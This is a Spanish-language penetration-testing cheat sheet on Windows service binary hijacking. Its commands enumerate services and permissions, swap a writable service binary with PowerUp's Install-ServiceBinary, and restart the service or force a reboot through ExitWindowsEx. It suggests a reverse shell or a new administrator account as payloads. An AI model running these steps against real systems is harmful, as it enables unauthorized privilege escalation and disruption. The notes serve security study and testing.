# Service Binary Hijacking

### Manual

> **Enumerar servicios con ruta de binario**

```powershell
Get-CimInstance -ClassName Win32_Service |
Where-Object {$_.State -eq 'Running' -and $_.PathName} |
Select-Object Name, State, StartMode, StartName, PathName
```

> **Mostrar permisos**

```bat
icacls "<PATH>"
```

| Máscara | Permisos                      |
| ------- | ----------------------------- |
| F       | Acceso total                  |
| M       | Acceso de modificación        |
| RX      | Acceso de lectura y ejecución |
| R       | Acceso de solo lectura        |
| W       | Acceso de escritura           |
| D       | Permiso de eliminación        |

En un caso en el que el grupo al que pertenece el usuario actual tiene permisos suficientes para modificar el binario, podemos reemplazarlo por otro que ejecute algo a nuestro favor.

Ejemplos: Reverse Shell, añadir un usuario al grupo Administradores, ejecutar comandos...

**Importante:** No basta con comprobar los permisos del ejecutable. También hay que revisar los permisos del directorio donde se encuentra, ya que pueden permitir eliminar o reemplazar el archivo aunque no tengamos permisos de escritura directamente sobre él.

También debemos comprobar con qué usuario se ejecuta el servicio (`StartName`). Para que exista una escalada de privilegios, el servicio debe ejecutarse con privilegios superiores a los del usuario actual.

Para que se ejecute el binario, hay distintas posibilidades:

* **Reiniciar el servicio**

```bat
net stop <service>
net start <service>
```

Para ello, necesitamos permisos suficientes para detener e iniciar el servicio. Además, si el servicio está ejecutándose, puede ser necesario detenerlo antes de reemplazar el ejecutable, ya que Windows puede impedir modificar un archivo que está en uso.

En caso de no tener capacidad para ello, se puede barajar la siguiente posibilidad:

* **Reiniciar el sistema (SeShutdownPrivilege)**

En caso de disponer del privilegio `SeShutdownPrivilege`, podemos reiniciar el sistema para que, si el servicio del que podemos abusar se inicia automáticamente, ejecute el binario que hemos reemplazado.

Podemos comprobar los privilegios disponibles con:

```bat
whoami /priv
```

```bat
shutdown /r /t 0
```

**Alternativa** (Forzar reinicio con ExitWindowsEx)

También podemos utilizar la API de Windows `ExitWindowsEx` desde PowerShell:

```powershell
$sys = '[DllImport("user32.dll")] public static extern bool ExitWindowsEx(uint uFlags, uint dwReason);'
$type = Add-Type -MemberDefinition $sys -Name "Win32Shut" -Namespace "Win32" -PassThru
$type::ExitWindowsEx(6, 0)
```

El valor `6` combina `EWX_REBOOT (2)` y `EWX_FORCE (4)`, por lo que fuerza el cierre de las aplicaciones y reinicia el sistema.

**Nota:** Esta llamada requiere que `SeShutdownPrivilege` esté habilitado en el token del proceso. `ExitWindowsEx` no habilita el privilegio automáticamente. Además, forzar el cierre puede provocar pérdida de datos.

***

### PowerUp

```powershell
Import-Module .\PowerUp.ps1 -Force
Get-ModifiableServiceFile
```

Este comando enumera los servicios cuyo binario o alguno de sus archivos asociados puede ser modificado por el usuario actual.

Ejemplo:

```yaml
ServiceName                     : BackupMonitor
Path                            : C:\BackupMonitor\BackupMonitor.exe
ModifiableFile                  : C:\BackupMonitor\BackupMonitor.exe
ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : .\roy
AbuseFunction                   : Install-ServiceBinary -Name 'BackupMonitor'
CanRestart                      : True
```

Podemos interpretar algunos de los campos:

* **ModifiableFile:** Archivo que el usuario actual puede modificar.
* **ModifiableFilePermissions:** Permisos que permiten modificar el archivo.
* **ModifiableFileIdentityReference:** Usuario o grupo al que pertenecen dichos permisos.
* **StartName:** Usuario con el que se ejecuta el servicio.
* **CanRestart:** Indica si el usuario actual tiene permisos para reiniciar el servicio.

`CanRestart = True` significa que podemos reiniciar el servicio con los permisos actuales. No indica que el binario sea modificable, ya que eso se refleja en los campos anteriores.

En este ejemplo, `StartName = .\roy` indica que el servicio se ejecuta con el usuario local `roy`. No debemos asumir que se ejecuta como `SYSTEM`; hay que comprobar los privilegios de dicha cuenta.

**Explotación**

PowerUp nos proporciona directamente una función para abusar del servicio:

```powershell
Install-ServiceBinary -Name 'BackupMonitor'
```

Esta función reemplaza el binario del servicio por uno preparado para ejecutar la acción correspondiente.

Una vez realizada la sustitución, podemos reiniciar el servicio si tenemos permisos:

```bat
net stop BackupMonitor
net start BackupMonitor
```

En caso de no poder reiniciarlo, podemos valorar el reinicio del sistema, siempre que se cumplan las condiciones anteriores.

**Restaurar el binario original**

Una vez terminada la explotación, podemos utilizar:

```powershell
Restore-ServiceBinary -Name 'BackupMonitor'
```
